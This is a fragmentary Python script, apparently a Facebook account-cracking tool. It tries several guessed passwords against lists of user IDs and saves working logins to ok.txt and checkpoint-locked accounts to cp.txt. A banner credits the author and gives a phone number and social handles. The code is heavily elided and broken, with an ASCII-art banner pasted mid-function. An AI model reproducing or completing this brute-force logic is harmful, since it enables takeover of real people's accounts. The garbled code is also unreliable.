...
def linex():
	os.system('echo  "\n ===')
def logo():
	os.system('echo "\n\n    ╔══════════\n    ║ CODING BY: {ZULFIQAR Baloch }   ║\n    ║ FACEBOOK   : MR.ZEEKO, ║\n    ║ WhatsApp   :+923403233915   ║\n   " | lolcat -a -d 2 -s 50')	
...
def log_sel():
	...
	if sel == "":
		...
		os.system('xdg-open https://wa.me/+1604670-6729')
		main()
...
def token():
    ...
    try:
        ...
        print("")
\033[94;1m        ____          _      ____   _____ _    _ 
\033[95;1m  |  _ \   /\   | |    / __ \ / ____| |  | |
\033[93;1m  | |_) | /  \  | |   | |  | | |    | |__| |
\033[94;1m  |  _ < / /\ \ | |   | |  | | |    |  __  |
 \033[97;1m | |_) / ____ \| |___| |__| | |____| |  | |
\033[92;1m  |____/_/    \_\______\____/ \_____|_|  |_|
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in q and "EAAA" in q:
				print(" \033[1;32m [AIZAZ-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				...
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;33m [AIZAZ-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
													...
													if "access_token" in q and "EAAA" in q:
														...
														if "www.facebook.com" in q["error_msg"]:
															...
															if "access_token" in q and "EAAA" in q:
																...
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;33m [CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	...
																	if "access_token" in q and "EAAA" in q:
																		...
																		if "www.facebook.com" in q["error_msg"]:
																			print(" \033[1;33m [CP] "+uid+" | "+pass8+"\033[0;97m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
